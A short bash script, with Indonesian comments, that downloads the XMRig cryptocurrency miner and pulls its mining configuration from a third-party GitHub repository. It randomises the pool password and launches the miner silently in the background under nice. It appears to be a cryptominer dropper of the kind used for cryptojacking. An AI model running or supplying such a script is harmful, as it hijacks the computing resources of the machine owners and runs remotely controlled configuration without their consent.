#!/bin/bash

XMRIG_DIR="xmrig-6.24.0"
XMRIG_BIN="./xmrig"

echo "gans"

# Cek xmrig
if pidof xmrig >/dev/null; then
    echo "[!] xmrig sudah berjalan"
    exit 0
fi

# Download xmrig
if [ ! -d "$XMRIG_DIR" ]; then
    wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
    tar -xvf xmrig-6.24.0-linux-static-x64.tar.gz
fi

cd "$XMRIG_DIR" || exit 1
rm -f config.json

# Download config
wget https://raw.githubusercontent.com/bintang4/simpel/refs/heads/master/Shshsh.json -O config.json

# Generate random pass
RAND_PASS="$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 6)"

echo "[+] pass = $RAND_PASS"

# Inject ke config.json (tanpa jq)
sed -i "s/\"pass\": *\"[^\"]*\"/\"pass\": \"$RAND_PASS\"/" config.json

chmod +x xmrig

# Run xmrig
nice $XMRIG_BIN >/dev/null 2>&1 &
